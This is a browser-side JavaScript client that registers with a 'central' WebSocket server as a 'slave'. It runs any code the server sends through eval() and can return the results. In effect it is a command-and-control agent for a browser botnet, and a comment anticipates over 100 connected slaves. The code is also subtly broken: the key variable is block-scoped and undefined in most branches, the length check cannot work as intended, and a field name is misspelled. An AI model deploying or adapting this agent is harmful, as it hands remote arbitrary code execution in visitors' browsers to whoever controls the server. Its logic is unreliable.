if(localStorage.getItem("__ussn_key") == null){
    let key = window.crypto.getRandomValues(new Uint32Array(1))[0].toString(16);
    localStorage.__ussn_key = key;
    console.log("key length "+key.length);
} else if(localStorage.getItem("__ussn_key").length != 16) {
    key = localStorage.getItem("__ussn_key");
} else {
    let key = window.crypto.getRandomValues(new Uint32Array(1))[0].toString(16);
    localStorage.__ussn_key = key;
}
let ws = new WebSocket("ws://localhost:3001");
ws.onopen = () => {
    console.log("Connected to central");
    ws.send(JSON.stringify({
        type: "slave",
        key: key
    }));
};
ws.onmessage = (data) => {
    data = JSON.parse(data.data);
    console.log(data);
    if(data.type == "ping"){
        ws.send(JSON.stringify({
            type: "pong"
        }));
    } else if(data.type == "execute"){
        if(data.repond){
            //*may* cause congestion when >100 slaves respond at once but ok
            ws.send(JSON.stringify({
                type: "response",
                data: eval(data.data)
            }));
        } else {
            eval(data.data);
        }
    }
};